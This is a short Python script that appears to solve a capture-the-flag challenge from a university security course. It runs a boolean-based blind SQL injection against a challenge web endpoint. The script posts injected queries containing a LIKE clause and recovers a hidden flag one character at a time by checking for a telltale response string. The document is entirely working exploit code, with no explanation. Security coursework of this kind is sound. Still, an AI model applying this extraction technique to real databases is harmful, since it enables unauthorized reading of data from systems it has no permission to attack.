#!/usr/bin/python

import requests
import sys

list = ['{','}','-','+',' ','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

query = "' and name like 'A%' and exists(select flag from flag where flag like 'COMP6843{}%') --"

exist = ""
found = False

while 1:
    found = False
    for i in range(len(list)):
        r = requests.post("http://oobydooby.ext.ns.agency/query", data={'query': query.format(exist + list[i])})
        if "results found. but not telling you :)" in r.text:
            exist += list[i]
            print exist
            found = True
            break
    if not found:        
        print "Finished"
        sys.exit(0)